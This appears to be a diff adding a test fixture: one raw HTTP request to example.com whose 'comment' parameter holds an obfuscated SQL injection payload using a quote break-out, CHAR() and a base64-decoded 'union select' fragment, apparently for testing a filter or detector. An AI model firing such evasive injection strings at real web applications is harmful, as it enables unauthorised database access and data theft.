@@ -1,0 +1,6 @@
+GET /test?comment=%27%20CHAR%2879%2C82%29%20deCodE%28%27dW5Pb24gc2vsZwN0IdEsmiWz%27%2C%20%27BAsE64%27%29-- HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Accept: */*
+Connection: close
+
